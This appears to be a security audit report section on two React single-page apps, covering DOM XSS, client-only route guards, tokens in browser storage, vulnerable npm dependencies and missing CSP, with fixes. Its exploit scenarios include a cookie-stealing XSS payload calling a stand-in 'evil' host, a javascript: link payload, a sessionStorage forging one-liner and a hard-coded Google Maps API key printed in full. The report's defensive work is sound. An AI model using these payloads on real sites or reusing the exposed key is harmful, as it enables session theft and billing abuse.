# 6. Security Hotspots Analysis

**Objective:** Address key OWASP-class security vulnerabilities and dependency risk.

**Date:** July 17, 2026 | **Scope:** `target/` — React 18 SPAs (Create React App) with Axios; no backend source in workspace (external API at `/api` / `localhost:3030`)

## Executive Summary

> **Executive Summary**
>
> The target workspace contains two React 18 single-page applications — **social-media-react** (Redux, React Router v5, Socket.io, session-cookie API client) and **workbench-demo** (TypeScript login demo, React Router v6) — with **no server-side application code** present locally; security depends on an external API referenced at `localhost:3030`. Review covered **both frontend layers** and dependency manifests. The most severe findings are **DOM-based XSS** via unsanitized `innerHTML` in search autocomplete, **client-side-only route protection** (including an unguarded `/dashboard` in workbench-demo), **JWT and user objects stored in browser storage**, a **hard-coded Google Maps API key** shipped in the client bundle, and **115 npm audit findings** (8 critical, 53 high across both apps). No CSP or security headers were found in either `public/index.html`. Overall posture is **High Risk**, driven by exploitable client-side access-control bypass, XSS, exposed secrets, and vulnerable/outdated dependencies.

<div class="metric-grid">
<div class="metric-card"><div class="metric-number">15</div><div class="metric-label">Files Scanned for Input Handling</div></div>
<div class="metric-card"><div class="metric-number">8</div><div class="metric-label">Concrete Injection/XSS/CSRF/CORS/Auth Findings</div></div>
<div class="metric-card"><div class="metric-number">115</div><div class="metric-label">Dependencies Flagged Outdated/Vulnerable</div></div>
<div class="metric-card"><div class="metric-number">10/12</div><div class="metric-label">OWASP Categories With Findings</div></div>
</div>

<div class="overall-rating overall-rating--high-risk"><div class="overall-rating-label">Overall Codebase Rating — Security</div><div class="overall-rating-value">High Risk</div><div class="overall-rating-note">Driven by DOM XSS, client-side-only auth bypass, secrets in the bundle, and 61 critical/high npm audit findings.</div></div>

## 6.1 Security Benchmark Ratings

| # | Security KPI | Target | <span class="rating rating-good">Good</span> | <span class="rating rating-moderate">Moderate</span> | <span class="rating rating-high-risk">High Risk</span> | Measured | Rating |
|---|---|---|---|---|---|---|---|
| H1 | Critical Vulnerabilities | 0 | 0 | 1 | >1 | 1 | <span class="rating rating-moderate">Moderate</span> |
| H2 | High Vulnerabilities | 0 | <5 | 5–10 | >10 | 12 | <span class="rating rating-high-risk">High Risk</span> |
| H3 | Medium Vulnerabilities | low | <20 | 20–50 | >50 | 4 | <span class="rating rating-good">Good</span> |
| H4 | Vulnerability Density | <0.5/KLOC | <0.5 | 0.5–1.0 | >1.0 | 2.5/KLOC | <span class="rating rating-high-risk">High Risk</span> |
| H5 | OWASP Top 10 Compliance | >95% | >95% | 80–95% | <80% | 17% clean (2/12) | <span class="rating rating-high-risk">High Risk</span> |
| H6 | Critical/High Vulnerable Deps | 0 | 0 | 1 | >1 | 61 | <span class="rating rating-high-risk">High Risk</span> |
| H7 | Outdated Dependencies | <10% | <10% | 10–25% | >25% | ~35% direct deps outdated/EOL | <span class="rating rating-high-risk">High Risk</span> |
| H8 | End-of-Life Dependencies | 0 | 0 | 1–5 | >5 | 2 (axios 0.27.x, react-router-dom 5.x) | <span class="rating rating-moderate">Moderate</span> |

No additional security findings beyond the standard set were observed.

## 6.2 Hotspot-by-Hotspot Evidence

### Client-Side Route Protection Bypass <span class="sev sev-high">High</span>

Both SPAs enforce authentication only in the browser. An attacker can navigate directly to protected routes or manipulate stored session objects without a valid server session.

**Example 1 — workbench-demo `/dashboard` has no auth guard**

`target/workbench-demo/src/App.tsx:14-16`:

```tsx
      <Route path="/login" element={<LoginPage />} />
      <Route path="/dashboard" element={<Dashboard />} />
      <Route path="*" element={<Navigate to="/login" replace />} />
```

**Example 2 — social-media-react checks sessionStorage only**

`target/social-media-react/src/cmps/PrivateRoute.jsx:4-12`:

```jsx
function PrivateRoute({ component: Component, ...rest }) {
  const isAuthenticated = userService.getLoggedinUser()

  return (
    <Route
      {...rest}
      render={(props) =>
        isAuthenticated ? <Component {...props} /> : <Redirect to="/signin" />
      }
    />
  )
}
```

**Exploit scenario:** An attacker opens `/dashboard` in workbench-demo without logging in and sees the dashboard UI immediately. In social-media-react, they open DevTools, run `sessionStorage.setItem('user', JSON.stringify({_id:'x',fullname:'Attacker'}))`, and reload — `PrivateRoute` grants access because it never validates the session cookie against the API.

**Recommended fix:**
1. Add a `ProtectedRoute` wrapper in `workbench-demo/src/App.tsx` that verifies a valid token via `/auth/me` before rendering `/dashboard`.
2. Replace `PrivateRoute` sessionStorage checks with an async bootstrap that calls `GET auth/me` (cookie session) on app load.
3. Redirect unauthenticated users server-side at the CDN/reverse-proxy for all `/main/*` paths.

<!-- affected-files
search: Route path="/dashboard"|getLoggedinUser\(\)
glob: target/{workbench-demo,social-media-react}/src/**/*.{jsx,tsx,js,ts}
issue: Client-side-only route guard
action: Validate session server-side before rendering protected routes
-->

### JWT Stored in localStorage (workbench-demo) <span class="sev sev-high">High</span>

`target/workbench-demo/src/pages/LoginPage.tsx:35-37`:

```tsx
      const { token } = await login({ email, password });
      localStorage.setItem("token", token);
      navigate("/dashboard");
```

**Exploit scenario:** Any XSS flaw (including transitive React Router XSS CVE GHSA-2w69-qvjg-hvjx in `@remix-run/router` ≤1.23.1) allows `localStorage.getItem('token')` exfiltration and full account takeover via replayed Bearer tokens.

**Recommended fix:**
1. Remove `localStorage.setItem("token", …)` from `LoginPage.tsx`.
2. Configure the API to issue `HttpOnly; Secure; SameSite=Strict` session cookies.
3. Attach credentials via `axios.defaults.withCredentials = true` in `authService.ts`.

<!-- affected-files
search: localStorage\.setItem\(["']token
glob: target/workbench-demo/src/**/*.{jsx,tsx,js,ts}
issue: JWT in localStorage (XSS-exfiltratable)
action: Move token to HttpOnly cookie; remove localStorage usage
-->

### User Session Object in sessionStorage (social-media-react) <span class="sev sev-high">High</span>

`target/social-media-react/src/services/user/userService.js:56-62`:

```javascript
function _saveLocalUser(user) {
  sessionStorage.setItem(STORAGE_KEY_LOGGEDIN_USER, JSON.stringify(user))
  return user
}

function getLoggedinUser() {
  return JSON.parse(sessionStorage.getItem(STORAGE_KEY_LOGGEDIN_USER) || 'null')
}
```

**Example 2 — Redux/bootstrap trusts stored user**

`target/social-media-react/src/cmps/PrivateRoute.jsx:5-6` reads `getLoggedinUser()` with no server round-trip.

**Exploit scenario:** Attacker injects a forged user object into `sessionStorage` and gains UI access to messaging, profile editing, and post creation; combined with missing server-side authorization on API endpoints this becomes full impersonation.

**Recommended fix:**
1. Stop persisting the full user object client-side; store only a non-sensitive session indicator if needed.
2. On app init, call `GET auth/me` and hydrate Redux from the server response.
3. Clear sessionStorage on logout and 401 responses globally in `httpService.js`.

<!-- affected-files
search: sessionStorage\.(setItem|getItem)\(
glob: target/social-media-react/src/**/*.{jsx,js}
issue: Auth state in sessionStorage
action: Server-validated session; minimize client-stored identity
-->

### Hard-Coded Google Maps API Key in Client Bundle <span class="sev sev-high">High</span>

`target/social-media-react/src/pages/Map.jsx:116-118`:

```jsx
        <GoogleMapReact
          bootstrapURLKeys={{ key: `AIzaSyC9AFUykGS85sRwdfagUSX3H2ib7relELI` }}
          defaultCenter={defaultProps.center}
```

**Exploit scenario:** Anyone who downloads the production JS bundle extracts the key and uses it from arbitrary origins, exhausting quota or incurring billing abuse on the Google Cloud project tied to this key.

**Recommended fix:**
1. Remove the literal key from `Map.jsx`; load via `process.env.REACT_APP_GOOGLE_MAPS_KEY` with HTTP referrer restrictions configured in Google Cloud Console.
2. Rotate the exposed key immediately.
3. Prefer a backend proxy that signs short-lived map tokens.

<!-- affected-files
search: AIza|bootstrapURLKeys
glob: target/social-media-react/src/**/*.{jsx,js}
issue: Hard-coded API key in client bundle
action: Externalize key to env + referrer restrictions; rotate key
-->

### FS1 — DOM XSS via innerHTML in Search Autocomplete <span class="sev sev-high">High</span>

`target/social-media-react/src/cmps/header/InputFilter.jsx:53-55`:

```jsx
    function addItem(value) {
      ulField.innerHTML = ulField.innerHTML + `<li>${value}</li>`
    }
```

**Example 2 — user display names feed the sink**

`target/social-media-react/src/cmps/header/InputFilter.jsx:66-69`:

```jsx
  const getUsersName = () => {
    if (!users) return
    const usersToReturn = users.map((user) => user.fullname)
    setUsersAutoComplete(usersToReturn)
```

**Exploit scenario:** Attacker sets their profile `fullname` to `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`. When any user types matching text in search, the malicious HTML executes in their browser, exfiltrating session cookies (`withCredentials: true` in `httpService.js`).

**Recommended fix:**
1. Replace `innerHTML` concatenation with React state rendering (`usersAutoComplete.map(name => <li key={name}>{name}</li>)`).
2. Sanitize or encode user display names server-side on profile update.
3. Add a strict CSP with `script-src 'self'` in `public/index.html`.

<!-- affected-files
search: innerHTML
glob: target/social-media-react/src/**/*.{jsx,js}
issue: DOM XSS via innerHTML
action: Render autocomplete with React; encode user-supplied names
-->

### FS2 — Secrets / API Keys in Client Code <span class="sev sev-high">High</span>

Evidence: hard-coded Google Maps key in `Map.jsx` (see above). No `REACT_APP_*` secret leakage observed in workbench-demo; `authService.ts` correctly uses `process.env.REACT_APP_API_BASE_URL` for the base URL only.

**Recommended fix:** Rotate and externalize the Maps key; audit build pipeline to block secret patterns in client bundles.

<!-- affected-files
search: AIza|sk-|ghp_|apiKey|api_key
glob: target/{social-media-react,workbench-demo}/src/**/*.{jsx,tsx,js,ts}
issue: Hard-coded secret/API key in client
action: Move to env + secret scanning in CI
-->

### FS3 — Auth Tokens in Browser Storage <span class="sev sev-high">High</span>

Evidence: `localStorage.setItem("token", …)` in workbench-demo `LoginPage.tsx:36`; `sessionStorage.setItem(STORAGE_KEY_LOGGEDIN_USER, …)` in social-media-react `userService.js:57`; generic entity persistence in `asyncStorageService.js:47`.

**Recommended fix:** HttpOnly cookies for auth tokens; never store JWTs or full user records in Web Storage.

<!-- affected-files
search: (localStorage|sessionStorage)\.(setItem|getItem)
glob: target/{social-media-react,workbench-demo}/src/**/*.{jsx,tsx,js,ts}
issue: Sensitive data in Web Storage
action: HttpOnly cookies; server-side session validation
-->

### FS4 — Vulnerable / Outdated npm Dependencies <span class="sev sev-critical">Critical</span>

**social-media-react** (`npm audit`): 75 vulnerabilities — 6 critical, 34 high, 20 moderate, 15 low. Notable direct dependency: `axios@^0.27.2` (multiple high CVEs; 0.x line unmaintained).

**workbench-demo** (`npm audit`): 40 vulnerabilities — 2 critical, 19 high, 9 moderate, 10 low. Direct `axios@1.7.2` affected by SSRF CVEs (GHSA-8hc4-vh64-cxmj, GHSA-jr5f-v2jv-69x6); `react-router-dom@6.23.1` pulls `@remix-run/router` with XSS open-redirect CVE GHSA-2w69-qvjg-hvjx.

**Exploit scenario:** Supply-chain or runtime exploitation of known axios/react-router CVEs in production builds; axios 0.27.x in social-media-react lacks security patches present in 1.x.

**Recommended fix:**
1. Upgrade social-media-react `axios` to ≥1.8.2 and workbench-demo `axios` to latest patched 1.x.
2. Upgrade workbench-demo `react-router-dom` to ≥6.30.4.
3. Run `npm audit fix` and wire `npm audit --audit-level=high` into CI for both apps.

<!-- affected-files
glob: target/{social-media-react,workbench-demo}/package.json
issue: Vulnerable/outdated npm dependencies
action: Upgrade axios, react-router-dom; add npm audit to CI
-->

### FS5 — Missing Frontend Security Controls <span class="sev sev-medium">Medium</span>

Neither SPA defines CSP or security headers in HTML templates.

`target/social-media-react/public/index.html:1-28` — no `Content-Security-Policy` meta tag or security headers.

`target/workbench-demo/public/index.html:1-11` — same omission.

**Example 2 — Unvalidated external URLs rendered in posts**

`target/social-media-react/src/cmps/posts/post-preview/PostBody.jsx:18-25`:

```jsx
        {link && (
          <a href={link} target="_blank" rel="noreferrer">
            <span className="the-link">{link}</span>
          </a>
        )}
      ...
        {imgUrl && <img src={imgUrl} alt="" />}
```

**Exploit scenario:** Attacker posts `link=javascript:alert(document.cookie)` or `imgUrl` pointing to a tracking endpoint; victims clicking or loading the post execute attacker-controlled navigation or leak Referer data. Missing CSP allows inline script injection from any XSS sink to execute freely.

**Recommended fix:**
1. Add CSP meta tag or serve headers: `default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'`.
2. Validate/sanitize `link`, `imgUrl`, and `videoUrl` server-side; block `javascript:` and data URLs client-side before render.
3. `target="_blank"` links already use `rel="noreferrer"` — maintain that pattern.

<!-- affected-files
search: href=\{link\}|src=\{imgUrl\}
glob: target/social-media-react/src/**/*.{jsx,js}
issue: Missing CSP; unvalidated external URLs
action: Add CSP; URL allow-list for user content
-->

### SQL Injection — Not observed

No server-side database code or raw SQL exists in `target/`. API backend is external and not present in this workspace.

### CSRF — Not observed in workspace source

`social-media-react` sends credentialed requests (`withCredentials: true` in `httpService.js`) but no CSRF token handling exists client-side; mitigation must be verified on the external API (SameSite cookies or CSRF tokens). Not observable locally.

### CORS Misconfiguration — Not observed in workspace source

No CORS middleware in repo; configuration lives on external API server.

## 6.3 OWASP Top 10 (2021) Coverage

| # | Category | Verdict | Evidence / Note |
|---|---|---|---|
| 6.1 | Broken Access Control | <span class="sev sev-high">High</span> | Client-side-only guards — `PrivateRoute.jsx`, unprotected `/dashboard` in `App.tsx` |
| 6.2 | Cryptographic Failures | <span class="sev sev-high">High</span> | Hard-coded Google Maps key `Map.jsx:117`; JWT in `localStorage` |
| 6.3 | Injection | <span class="sev sev-high">High</span> | DOM XSS via `innerHTML` in `InputFilter.jsx:54` |
| 6.4 | Insecure Design | <span class="sev sev-high">High</span> | Authorization and session trust implemented only in browser |
| 6.5 | Security Misconfiguration | <span class="sev sev-medium">Medium</span> | No CSP/security headers in either `public/index.html` |
| 6.6 | Vulnerable and Outdated Components | <span class="sev sev-critical">Critical</span> | 115 npm audit findings; axios 0.27.x EOL |
| 6.7 | Identification and Authentication Failures | <span class="sev sev-high">High</span> | Session/user objects in Web Storage; no server validation on route entry |
| 6.8 | Software and Data Integrity Failures | <span class="sev sev-low">Clean</span> | Lockfiles present; no unsigned auto-update logic in app source |
| 6.9 | Security Logging and Monitoring Failures | <span class="sev sev-medium">Medium</span> | No client auth-failure telemetry or audit logging observed |
| 6.10 | Server-Side Request Forgery (SSRF) | <span class="sev sev-low">Clean</span> | No server-side HTTP client in workspace; SSRF N/A locally |
| 6.11 | Other Security Reviews | <span class="sev sev-medium">Medium</span> | Unvalidated user URLs in `PostBody.jsx` (`href`, `img src`) |
| 6.12 | DevSecOps Security Assessment | <span class="sev sev-high">High</span> | No project-level CI with `npm audit`/SAST; `target/.env` present (not readable) |

## 6.4 Diagrams

### Auth / request trust boundary

```mermaid
sequenceDiagram
  participant U as User Browser
  participant SPA as React SPA
  participant API as External API
  participant D as Data store
  U->>SPA: Navigate to /dashboard
  SPA->>SPA: Check sessionStorage/localStorage only
  Note over SPA: No server validation on route entry
  U->>SPA: API call via Axios
  SPA->>API: Request + cookies (withCredentials)
  API->>D: Query
  D-->>API: Data
  API-->>SPA: Response
  SPA-->>U: Render UI
```

### Top security risk flow

```mermaid
flowchart TD
  A[User input or profile data] --> B{Encoded before DOM write?}
  B -->|No innerHTML| C[XSS in InputFilter]
  B -->|React text nodes| D[Lower XSS risk]
  E[Protected route request] --> F{Server session validated?}
  F -->|No| G[Client-side auth bypass]
  F -->|Yes| H[Authorized access]
  I[npm dependencies] --> J{Patched versions?}
  J -->|No| K[Known CVE exploitation]
```

### Improvement roadmap

```mermaid
flowchart LR
  P1["Phase 1<br/>Fix XSS + auth bypass"] --> P2["Phase 2<br/>Secrets + deps upgrade"] --> P3["Phase 3<br/>CSP + CI scanning"] --> P4["Phase 4<br/>Server auth hardening"]
  classDef todo fill:#1e3a5f,stroke:#0f3460,color:#fff
  classDef first fill:#e74c3c,stroke:#c0392b,color:#fff
  classDef last fill:#27ae60,stroke:#1e8449,color:#fff
  class P1 first
  class P2 todo
  class P3 todo
  class P4 last
```

## 6.5 Actions Required

| Finding | Action | Rating | Priority |
|---|---|---|---|
| DOM XSS via innerHTML autocomplete | Replace `innerHTML` in `InputFilter.jsx` with React-rendered list; encode user display names server-side | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| Client-side-only route protection | Add server-validated `ProtectedRoute` in both apps; guard `/dashboard` in workbench-demo | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| JWT in localStorage | Remove token from `localStorage`; use HttpOnly session cookies | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| User object in sessionStorage | Stop trusting `sessionStorage` user; bootstrap via `GET auth/me` | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| Hard-coded Google Maps API key | Rotate key; move to env var with referrer restrictions | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| Vulnerable npm dependencies (115 total) | Upgrade axios, react-router-dom; run `npm audit fix`; add CI gate | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-critical">Critical</span> |
| Missing CSP / security headers | Add CSP to both `public/index.html` or reverse-proxy headers | <span class="rating rating-moderate">Moderate</span> | <span class="sev sev-medium">Medium</span> |
| Unvalidated user URLs in posts | Allow-list http/https URLs for `link`, `imgUrl`, `videoUrl` | <span class="rating rating-moderate">Moderate</span> | <span class="sev sev-medium">Medium</span> |
| No DevSecOps scanning in CI | Add `npm audit --audit-level=high` and secret scanning to pipeline | <span class="rating rating-high-risk">High Risk</span> | <span class="sev sev-high">High</span> |
| No security audit logging | Log auth failures and access denials server-side; avoid logging tokens | <span class="rating rating-moderate">Moderate</span> | <span class="sev sev-medium">Medium</span> |

## 6.6 Expected Outcomes

- Eliminates the DOM XSS vector in search autocomplete and reduces stored-XSS blast radius for user-generated profile names.
- Server-validated sessions and HttpOnly cookies prevent trivial route bypass and token exfiltration via XSS.
- Rotated and restricted API keys stop unauthorized quota/billing abuse on Google Maps.
- Dependency upgrades and CI audit gates catch future CVEs before production deploys.
- CSP and URL validation reduce impact of any remaining injection or open-redirect flaws.
